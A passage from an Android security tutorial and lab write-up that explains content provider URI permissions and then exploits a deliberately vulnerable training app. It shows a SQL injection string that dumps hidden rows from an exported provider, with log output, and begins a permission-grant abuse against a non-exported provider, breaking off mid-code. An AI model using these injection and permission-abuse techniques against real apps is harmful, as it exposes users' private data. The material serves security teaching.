+<div class="sourceCode" id="cb25"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> MainActivity <span class="kw">extends</span> Activity <span class="op">{</span></span>
+<span id="cb25-2"><a href="#cb25-2" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb25-3"><a href="#cb25-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onCreate</span><span class="op">(</span>Bundle savedInstanceState<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb25-4"><a href="#cb25-4" aria-hidden="true" tabindex="-1"></a>        <span class="kw">super</span><span class="op">.</span><span class="fu">onCreate</span><span class="op">(</span>savedInstanceState<span class="op">);</span></span>
+<span id="cb25-5"><a href="#cb25-5" aria-hidden="true" tabindex="-1"></a>        TextView tv <span class="op">=</span> <span class="kw">new</span> <span class="fu">TextView</span><span class="op">(</span><span class="kw">this</span><span class="op">);</span></span>
+<span id="cb25-6"><a href="#cb25-6" aria-hidden="true" tabindex="-1"></a>        <span class="fu">setContentView</span><span class="op">(</span>tv<span class="op">);</span></span>
+<span id="cb25-7"><a href="#cb25-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb25-8"><a href="#cb25-8" aria-hidden="true" tabindex="-1"></a>        <span class="co">// Get the URI sent from App A</span></span>
+<span id="cb25-9"><a href="#cb25-9" aria-hidden="true" tabindex="-1"></a>        Uri uriFromIntent <span class="op">=</span> <span class="fu">getIntent</span><span class="op">().</span><span class="fu">getData</span><span class="op">();</span></span>
+<span id="cb25-10"><a href="#cb25-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb25-11"><a href="#cb25-11" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>uriFromIntent <span class="op">!=</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb25-12"><a href="#cb25-12" aria-hidden="true" tabindex="-1"></a>            <span class="cf">try</span> <span class="op">{</span></span>
+<span id="cb25-13"><a href="#cb25-13" aria-hidden="true" tabindex="-1"></a>                <span class="co">// Attempt to query the data.</span></span>
+<span id="cb25-14"><a href="#cb25-14" aria-hidden="true" tabindex="-1"></a>                <span class="co">// The OS checks the temporary whitelist created by the flag.</span></span>
+<span id="cb25-15"><a href="#cb25-15" aria-hidden="true" tabindex="-1"></a>                <span class="bu">Cursor</span> cursor <span class="op">=</span> <span class="fu">getContentResolver</span><span class="op">().</span><span class="fu">query</span><span class="op">(</span>uriFromIntent<span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">null</span><span class="op">);</span></span>
+<span id="cb25-16"><a href="#cb25-16" aria-hidden="true" tabindex="-1"></a>                </span>
+<span id="cb25-17"><a href="#cb25-17" aria-hidden="true" tabindex="-1"></a>                <span class="cf">if</span> <span class="op">(</span>cursor <span class="op">!=</span> <span class="kw">null</span> <span class="op">&amp;&amp;</span> cursor<span class="op">.</span><span class="fu">moveToFirst</span><span class="op">())</span> <span class="op">{</span></span>
+<span id="cb25-18"><a href="#cb25-18" aria-hidden="true" tabindex="-1"></a>                    <span class="co">// Assuming column index 1 contains the &quot;secret_message&quot;</span></span>
+<span id="cb25-19"><a href="#cb25-19" aria-hidden="true" tabindex="-1"></a>                    <span class="bu">String</span> secret <span class="op">=</span> cursor<span class="op">.</span><span class="fu">getString</span><span class="op">(</span><span class="dv">1</span><span class="op">);</span> </span>
+<span id="cb25-20"><a href="#cb25-20" aria-hidden="true" tabindex="-1"></a>                    tv<span class="op">.</span><span class="fu">setText</span><span class="op">(</span><span class="st">&quot;Success! Received: &quot;</span> <span class="op">+</span> secret<span class="op">);</span></span>
+<span id="cb25-21"><a href="#cb25-21" aria-hidden="true" tabindex="-1"></a>                    cursor<span class="op">.</span><span class="fu">close</span><span class="op">();</span></span>
+<span id="cb25-22"><a href="#cb25-22" aria-hidden="true" tabindex="-1"></a>                <span class="op">}</span></span>
+<span id="cb25-23"><a href="#cb25-23" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span> <span class="cf">catch</span> <span class="op">(</span><span class="bu">SecurityException</span> e<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb25-24"><a href="#cb25-24" aria-hidden="true" tabindex="-1"></a>                <span class="co">// This block runs if the flag was missing or grantUriPermissions=&quot;false&quot;</span></span>
+<span id="cb25-25"><a href="#cb25-25" aria-hidden="true" tabindex="-1"></a>                tv<span class="op">.</span><span class="fu">setText</span><span class="op">(</span><span class="st">&quot;Failed: Permission Denied&quot;</span><span class="op">);</span></span>
+<span id="cb25-26"><a href="#cb25-26" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
+<span id="cb25-27"><a href="#cb25-27" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
+<span id="cb25-28"><a href="#cb25-28" aria-hidden="true" tabindex="-1"></a>            tv<span class="op">.</span><span class="fu">setText</span><span class="op">(</span><span class="st">&quot;Waiting for data...&quot;</span><span class="op">);</span></span>
+<span id="cb25-29"><a href="#cb25-29" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb25-30"><a href="#cb25-30" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb25-31"><a href="#cb25-31" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p><strong>How it works</strong></p>
+<ol type="1">
+<li>App A’s provider is locked via <code>android:permission</code>. Since App B does not have this signature-level permission, it is normally blocked by the OS.</li>
+<li>App A sets <code>android:grantUriPermissions="true"</code>. It tells Android that, even though the provider is locked, it reserves the right to let other apps in if I say so.</li>
+<li>App A sends an Intent with <code>intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)</code>.</li>
+<li>When App B starts, the OS sees the flag. It creates a temporary whitelist entry allowing App B access to only that specific URI. When App B calls <code>query()</code>, the OS checks this whitelist and approves the request.</li>
+</ol>
+</details>
+<h3 id="granting-the-permission-to-a-specific-package">Granting the permission to a specific package</h3>
+<p>Call the method <code>Context.grantUriPermission(package, Uri, mode_flags)</code> for the <code>content://Uri</code>, using the desired mode flags. This grants temporary access permission for the content URI to the specified package, according to the value of the the <code>mode_flags</code> parameter, which you can set to <code>FLAG_GRANT_READ_URI_PERMISSION</code>, <code>FLAG_GRANT_WRITE_URI_PERMISSION</code> or both. The permission remains in effect until <code>revokeUriPermission()</code> is called to revoke it or until the device reboots.</p>
+<hr />
+<h2 id="vulnerabilities">Vulnerabilities</h2>
+<h3 id="sql-injection-in-content-providers">SQL Injection in content providers</h3>
+<p>Let’s say that the app <code>io.hextree.attacksurface</code> has the following ContentProvider:</p>
+<div class="sourceCode" id="cb26"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">provider</span></span>
+<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;io.hextree.attacksurface.providers.Flag32Provider&quot;</span></span>
+<span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:enabled=</span><span class="st">&quot;true&quot;</span></span>
+<span id="cb26-4"><a href="#cb26-4" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;true&quot;</span></span>
+<span id="cb26-5"><a href="#cb26-5" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:authorities=</span><span class="st">&quot;io.hextree.flag32&quot;</span>/&gt;</span></code></pre></div>
+<div class="sourceCode" id="cb27"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> Flag32Provider <span class="kw">extends</span> ContentProvider <span class="op">{</span></span>
+<span id="cb27-2"><a href="#cb27-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">...</span></span>
+<span id="cb27-3"><a href="#cb27-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb27-4"><a href="#cb27-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">static</span> <span class="op">{</span></span>
+<span id="cb27-5"><a href="#cb27-5" aria-hidden="true" tabindex="-1"></a>        UriMatcher uriMatcher2 <span class="op">=</span> <span class="kw">new</span> <span class="fu">UriMatcher</span><span class="op">(-</span><span class="dv">1</span><span class="op">);</span></span>
+<span id="cb27-6"><a href="#cb27-6" aria-hidden="true" tabindex="-1"></a>        uriMatcher <span class="op">=</span> uriMatcher2<span class="op">;</span></span>
+<span id="cb27-7"><a href="#cb27-7" aria-hidden="true" tabindex="-1"></a>        uriMatcher2<span class="op">.</span><span class="fu">addURI</span><span class="op">(</span>AUTHORITY<span class="op">,</span> <span class="st">&quot;flags&quot;</span><span class="op">,</span> <span class="dv">1</span><span class="op">);</span></span>
+<span id="cb27-8"><a href="#cb27-8" aria-hidden="true" tabindex="-1"></a>        uriMatcher2<span class="op">.</span><span class="fu">addURI</span><span class="op">(</span>AUTHORITY<span class="op">,</span> <span class="st">&quot;flag/#&quot;</span><span class="op">,</span> <span class="dv">2</span><span class="op">);</span></span>
+<span id="cb27-9"><a href="#cb27-9" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb27-10"><a href="#cb27-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb27-11"><a href="#cb27-11" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span> <span class="co">// android.content.ContentProvider</span></span>
+<span id="cb27-12"><a href="#cb27-12" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="bu">Cursor</span> <span class="fu">query</span><span class="op">(</span>Uri uri<span class="op">,</span> <span class="bu">String</span><span class="op">[]</span> strArr<span class="op">,</span> <span class="bu">String</span> str<span class="op">,</span> <span class="bu">String</span><span class="op">[]</span> strArr2<span class="op">,</span> <span class="bu">String</span> str2<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb27-13"><a href="#cb27-13" aria-hidden="true" tabindex="-1"></a>        <span class="bu">StringBuilder</span> sbAppend <span class="op">=</span> <span class="kw">new</span> <span class="bu">StringBuilder</span><span class="op">(</span><span class="st">&quot;Flag32Provider.query(&#39;&quot;</span><span class="op">).</span><span class="fu">append</span><span class="op">(</span>uri<span class="op">.</span><span class="fu">getPath</span><span class="op">()).</span><span class="fu">append</span><span class="op">(</span><span class="st">&quot;&#39;): &quot;</span><span class="op">);</span></span>
+<span id="cb27-14"><a href="#cb27-14" aria-hidden="true" tabindex="-1"></a>        UriMatcher uriMatcher2 <span class="op">=</span> uriMatcher<span class="op">;</span></span>
+<span id="cb27-15"><a href="#cb27-15" aria-hidden="true" tabindex="-1"></a>        SQLiteDatabase readableDatabase <span class="op">=</span> <span class="kw">this</span><span class="op">.</span><span class="fu">dbHelper</span><span class="op">.</span><span class="fu">getReadableDatabase</span><span class="op">();</span></span>
+<span id="cb27-16"><a href="#cb27-16" aria-hidden="true" tabindex="-1"></a>        <span class="dt">int</span> iMatch <span class="op">=</span> uriMatcher2<span class="op">.</span><span class="fu">match</span><span class="op">(</span>uri<span class="op">);</span></span>
+<span id="cb27-17"><a href="#cb27-17" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>iMatch <span class="op">!=</span> <span class="dv">1</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb27-18"><a href="#cb27-18" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> <span class="op">(</span>iMatch <span class="op">==</span> <span class="dv">2</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb27-19"><a href="#cb27-19" aria-hidden="true" tabindex="-1"></a>                <span class="dt">long</span> id <span class="op">=</span> ContentUris<span class="op">.</span><span class="fu">parseId</span><span class="op">(</span>uri<span class="op">);</span></span>
+<span id="cb27-20"><a href="#cb27-20" aria-hidden="true" tabindex="-1"></a>                <span class="cf">return</span> readableDatabase<span class="op">.</span><span class="fu">query</span><span class="op">(</span>FlagDatabaseHelper<span class="op">.</span><span class="fu">TABLE_FLAG</span><span class="op">,</span> strArr<span class="op">,</span> <span class="st">&quot;name=? AND visible=1&quot;</span><span class="op">,</span> <span class="kw">new</span> <span class="bu">String</span><span class="op">[]{</span><span class="st">&quot;flag&quot;</span> <span class="op">+</span> id<span class="op">},</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">null</span><span class="op">,</span> str2<span class="op">);</span></span>
+<span id="cb27-21"><a href="#cb27-21" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
+<span id="cb27-22"><a href="#cb27-22" aria-hidden="true" tabindex="-1"></a>            <span class="cf">throw</span> <span class="kw">new</span> <span class="bu">IllegalArgumentException</span><span class="op">(</span><span class="st">&quot;Unknown URI: &quot;</span> <span class="op">+</span> uri<span class="op">);</span></span>
+<span id="cb27-23"><a href="#cb27-23" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb27-24"><a href="#cb27-24" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> str3 <span class="op">=</span> <span class="st">&quot;visible=1&quot;</span> <span class="op">+</span> <span class="op">(</span>str <span class="op">!=</span> <span class="kw">null</span> <span class="op">?</span> <span class="st">&quot; AND (&quot;</span> <span class="op">+</span> str <span class="op">+</span> <span class="st">&quot;)&quot;</span> <span class="op">:</span> <span class="st">&quot;&quot;</span><span class="op">);</span></span>
+<span id="cb27-25"><a href="#cb27-25" aria-hidden="true" tabindex="-1"></a>        <span class="bu">Cursor</span> cursorQuery <span class="op">=</span> readableDatabase<span class="op">.</span><span class="fu">query</span><span class="op">(</span>FlagDatabaseHelper<span class="op">.</span><span class="fu">TABLE_FLAG</span><span class="op">,</span> strArr<span class="op">,</span> str3<span class="op">,</span> strArr2<span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">null</span><span class="op">,</span> str2<span class="op">);</span></span>
+<span id="cb27-26"><a href="#cb27-26" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span><span class="fu">containsFlag32</span><span class="op">(</span>cursorQuery<span class="op">))</span> <span class="op">{</span></span>
+<span id="cb27-27"><a href="#cb27-27" aria-hidden="true" tabindex="-1"></a>            <span class="fu">success</span><span class="op">(</span>logHelper<span class="op">);</span></span>
+<span id="cb27-28"><a href="#cb27-28" aria-hidden="true" tabindex="-1"></a>            cursorQuery<span class="op">.</span><span class="fu">requery</span><span class="op">();</span></span>
+<span id="cb27-29"><a href="#cb27-29" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb27-30"><a href="#cb27-30" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> cursorQuery<span class="op">;</span></span>
+<span id="cb27-31"><a href="#cb27-31" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb27-32"><a href="#cb27-32" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>To retrieve the flag, you need to perform a SQLi as shown below:</p>
+<div class="sourceCode" id="cb28"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onCreate</span><span class="op">(</span>Bundle savedInstanceState<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb28-2"><a href="#cb28-2" aria-hidden="true" tabindex="-1"></a>        <span class="kw">...</span><span class="op">.</span></span>
+<span id="cb28-3"><a href="#cb28-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb28-4"><a href="#cb28-4" aria-hidden="true" tabindex="-1"></a>        <span class="fu">String</span> selection <span class="op">=</span> <span class="st">&quot;1) or 1=1--&quot;</span><span class="op">;</span></span>
+<span id="cb28-5"><a href="#cb28-5" aria-hidden="true" tabindex="-1"></a>        <span class="fu">dump</span><span class="op">(</span>Uri<span class="op">.</span><span class="fu">parse</span><span class="op">(</span><span class="st">&quot;content://io.hextree.flag32/flags&quot;</span><span class="op">),</span> selection<span class="op">);</span></span>
+<span id="cb28-6"><a href="#cb28-6" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb28-7"><a href="#cb28-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb28-8"><a href="#cb28-8" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="dt">void</span> <span class="fu">dump</span><span class="op">(</span>Uri uri<span class="op">,</span> <span class="bu">String</span> selection<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb28-9"><a href="#cb28-9" aria-hidden="true" tabindex="-1"></a>        <span class="bu">Cursor</span> cursor <span class="op">=</span> <span class="fu">getContentResolver</span><span class="op">().</span><span class="fu">query</span><span class="op">(</span>uri<span class="op">,</span> <span class="kw">null</span><span class="op">,</span> selection<span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">null</span><span class="op">);</span></span>
+<span id="cb28-10"><a href="#cb28-10" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>cursor<span class="op">.</span><span class="fu">moveToFirst</span><span class="op">())</span> <span class="op">{</span></span>
+<span id="cb28-11"><a href="#cb28-11" aria-hidden="true" tabindex="-1"></a>            <span class="cf">do</span> <span class="op">{</span></span>
+<span id="cb28-12"><a href="#cb28-12" aria-hidden="true" tabindex="-1"></a>                <span class="bu">StringBuilder</span> sb <span class="op">=</span> <span class="kw">new</span> <span class="bu">StringBuilder</span><span class="op">();</span></span>
+<span id="cb28-13"><a href="#cb28-13" aria-hidden="true" tabindex="-1"></a>                <span class="cf">for</span> <span class="op">(</span><span class="dt">int</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> cursor<span class="op">.</span><span class="fu">getColumnCount</span><span class="op">();</span> i<span class="op">++)</span> <span class="op">{</span></span>
+<span id="cb28-14"><a href="#cb28-14" aria-hidden="true" tabindex="-1"></a>                    <span class="cf">if</span> <span class="op">(</span>sb<span class="op">.</span><span class="fu">length</span><span class="op">()</span> <span class="op">&gt;</span> <span class="dv">0</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb28-15"><a href="#cb28-15" aria-hidden="true" tabindex="-1"></a>                        sb<span class="op">.</span><span class="fu">append</span><span class="op">(</span><span class="st">&quot;, &quot;</span><span class="op">);</span></span>
+<span id="cb28-16"><a href="#cb28-16" aria-hidden="true" tabindex="-1"></a>                    <span class="op">}</span></span>
+<span id="cb28-17"><a href="#cb28-17" aria-hidden="true" tabindex="-1"></a>                    sb<span class="op">.</span><span class="fu">append</span><span class="op">(</span>cursor<span class="op">.</span><span class="fu">getColumnName</span><span class="op">(</span>i<span class="op">)</span> <span class="op">+</span> <span class="st">&quot; = &quot;</span> <span class="op">+</span> cursor<span class="op">.</span><span class="fu">getString</span><span class="op">(</span>i<span class="op">));</span></span>
+<span id="cb28-18"><a href="#cb28-18" aria-hidden="true" tabindex="-1"></a>                <span class="op">}</span></span>
+<span id="cb28-19"><a href="#cb28-19" aria-hidden="true" tabindex="-1"></a>                Log<span class="op">.</span><span class="fu">d</span><span class="op">(</span><span class="st">&quot;evil&quot;</span><span class="op">,</span> sb<span class="op">.</span><span class="fu">toString</span><span class="op">());</span></span>
+<span id="cb28-20"><a href="#cb28-20" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span> <span class="cf">while</span> <span class="op">(</span>cursor<span class="op">.</span><span class="fu">moveToNext</span><span class="op">());</span></span>
+<span id="cb28-21"><a href="#cb28-21" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb28-22"><a href="#cb28-22" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span></code></pre></div>
+<p>Log:</p>
+<pre><code>evil    com.example.myapplication   D  _id = 1, name = flag30, value = HXT{...}, visible = 1
+evil    com.example.myapplication   D  _id = 2, name = flag31, value = HXT{...}, visible = 1
+evil    com.example.myapplication   D  _id = 3, name = flag32, value = HXT{...}, visible = 0</code></pre>
+<h3 id="access-to-a-not-exported-provider-1-sqli">Access to a not exported provider (1) (+ SQLi)</h3>
+<p>Let’s start by analyzing the manifest for the <code>io.hextree.attacksurface</code> app. We see a <code>ContentProvider</code> defined as follows:</p>
+<div class="sourceCode" id="cb30"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">provider</span></span>
+<span id="cb30-2"><a href="#cb30-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;io.hextree.attacksurface.providers.Flag33Provider1&quot;</span></span>
+<span id="cb30-3"><a href="#cb30-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:enabled=</span><span class="st">&quot;true&quot;</span></span>
+<span id="cb30-4"><a href="#cb30-4" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;false&quot;</span></span>
+<span id="cb30-5"><a href="#cb30-5" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:authorities=</span><span class="st">&quot;io.hextree.flag33_1&quot;</span></span>
+<span id="cb30-6"><a href="#cb30-6" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:grantUriPermissions=</span><span class="st">&quot;true&quot;</span>/&gt;</span></code></pre></div>
+<p>Notice that while <code>android:exported</code> is <code>false</code>, <code>android:grantUriPermissions</code> is set to <code>true</code>. This configuration suggests we might be able to access the provider if we can trick a privileged component into granting us permission. So now let’s take a look at the <code>Flag33Activity1</code>:</p>
+<div class="sourceCode" id="cb31"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">activity</span></span>
+<span id="cb31-2"><a href="#cb31-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;io.hextree.attacksurface.activities.Flag33Activity1&quot;</span></span>
+<span id="cb31-3"><a href="#cb31-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;true&quot;</span>&gt;</span>
+<span id="cb31-4"><a href="#cb31-4" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">intent-filter</span>&gt;</span>
+<span id="cb31-5"><a href="#cb31-5" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">action</span><span class="ot"> android:name=</span><span class="st">&quot;io.hextree.FLAG33&quot;</span>/&gt;</span>
+<span id="cb31-6"><a href="#cb31-6" aria-hidden="true" tabindex="-1"></a>    &lt;/<span class="kw">intent-filter</span>&gt;</span>
+<span id="cb31-7"><a href="#cb31-7" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">activity</span>&gt;</span></code></pre></div>
+<div class="sourceCode" id="cb32"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> Flag33Activity1 <span class="kw">extends</span> AppCompactActivity <span class="op">{</span></span>
+<span id="cb32-2"><a href="#cb32-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">...</span></span>
+<span id="cb32-3"><a href="#cb32-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="fu">Flag33Activity1</span><span class="op">()</span> <span class="op">{</span><span class="kw">...</span><span class="op">}</span></span>
+<span id="cb32-4"><a href="#cb32-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb32-5"><a href="#cb32-5" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb32-6"><a href="#cb32-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onCreate</span><span class="op">(</span>Bundle bundle<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb32-7"><a href="#cb32-7" aria-hidden="true" tabindex="-1"></a>        <span class="kw">super</span><span class="op">.</span><span class="fu">onCreate</span><span class="op">(</span>bundle<span class="op">);</span></span>
+<span id="cb32-8"><a href="#cb32-8" aria-hidden="true" tabindex="-1"></a>        Intent intent <span class="op">=</span> <span class="fu">getIntent</span><span class="op">();</span></span>
+<span id="cb32-9"><a href="#cb32-9" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> stringExtra <span class="op">=</span> intent<span class="op">.</span><span class="fu">getStringExtra</span><span class="op">(</span><span class="st">&quot;secret&quot;</span><span class="op">);</span></span>
+<span id="cb32-10"><a href="#cb32-10" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>stringExtra <span class="op">==</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb32-11"><a href="#cb32-11" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> <span class="op">(</span>intent<span class="op">.</span><span class="fu">getAction</span><span class="op">()</span> <span class="op">==</span> <span class="kw">null</span> <span class="op">||</span> <span class="op">!</span>intent<span class="op">.</span><span class="fu">getAction</span><span class="op">().</span><span class="fu">equals</span><span class="op">(</span><span class="st">&quot;io.hextree.FLAG33&quot;</span><span class="op">))</span> <span class="op">{</span></span>
+<span id="cb32-12"><a href="#cb32-12" aria-hidden="true" tabindex="-1"></a>                <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb32-13"><a href="#cb32-13" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
+<span id="cb32-14"><a href="#cb32-14" aria-hidden="true" tabindex="-1"></a>            intent<span class="op">.</span><span class="fu">setData</span><span class="op">(</span>Uri<span class="op">.</span><span class="fu">parse</span><span class="op">(</span><span class="st">&quot;content://io.hextree.flag33_1/flags&quot;</span><span class="op">));</span></span>
+<span id="cb32-15"><a href="#cb32-15" aria-hidden="true" tabindex="-1"></a>            intent<span class="op">.</span><span class="fu">addFlags</span><span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
+<span id="cb32-16"><a href="#cb32-16" aria-hidden="true" tabindex="-1"></a>            <span class="fu">setResult</span><span class="op">(-</span><span class="dv">1</span><span class="op">,</span> intent<span class="op">);</span></span>
+<span id="cb32-17"><a href="#cb32-17" aria-hidden="true" tabindex="-1"></a>            <span class="fu">finish</span><span class="op">();</span></span>
+<span id="cb32-18"><a href="#cb32-18" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb32-19"><a href="#cb32-19" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb32-20"><a href="#cb32-20" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>Flag33Provider1<span class="op">.</span><span class="fu">secret</span><span class="op">.</span><span class="fu">equals</span><span class="op">(</span>stringExtra<span class="op">))</span> <span class="op">{</span><span class="kw">...</span><span class="op">}</span></span>
+<span id="cb32-21"><a href="#cb32-21" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb32-22"><a href="#cb32-22" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>In the <code>onCreate</code> method, the activity checks if the intent action is <code>io.hextree.FLAG33</code>. If it matches, the app sets the intent data to the provider’s URI and calls <code>intent.addFlags(1)</code>. This integer corresponds to <code>Intent.FLAG_GRANT_READ_URI_PERMISSION</code>. Essentially, this activity creates a “ticket” that allows anyone who calls it to read the private provider.</p>
+<p>According to the proper settings, we can write the following code to send the intent to <code>Flag33Activity1</code>. After <code>onCreate()</code> executes in <code>Flag33Activity1</code>, our app will be granted access to the provider.</p>
+<div class="sourceCode" id="cb33"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> MainActivity <span class="kw">extends</span> AppCompatActivity <span class="op">{</span></span>
+<span id="cb33-2"><a href="#cb33-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb33-3"><a href="#cb33-3" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb33-4"><a href="#cb33-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onCreate</span><span class="op">(</span>Bundle savedInstanceState<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb33-5"><a href="#cb33-5" aria-hidden="true" tabindex="-1"></a>        <span class="kw">...</span></span>
+<span id="cb33-6"><a href="#cb33-6" aria-hidden="true" tabindex="-1"></a>        Intent intent <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">();</span></span>
+<span id="cb33-7"><a href="#cb33-7" aria-hidden="true" tabindex="-1"></a>        intent<span class="op">.</span><span class="fu">setAction</span><span class="op">(</span><span class="st">&quot;io.hextree.FLAG33&quot;</span><span class="op">);</span></span>
+<span id="cb33-8"><a href="#cb33-8" aria-hidden="true" tabindex="-1"></a>        intent<span class="op">.</span><span class="fu">setComponent</span><span class="op">(</span><span class="kw">new</span> <span class="fu">ComponentName</span><span class="op">(</span><span class="st">&quot;io.hextree.attacksurface&quot;</span><span class="op">,</span> <span class="st">&quot;io.hextree.attacksurface.activities.Flag33Activity1&quot;</span><span class="op">));</span></span>
+<span id="cb33-9"><a href="#cb33-9" aria-hidden="true" tabindex="-1"></a>        <span class="fu">startActivityForResult</span><span class="op">(</span>intent<span class="op">,</span> <span class="dv">1</span><span class="op">);</span></span>
+<span id="cb33-10"><a href="#cb33-10" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
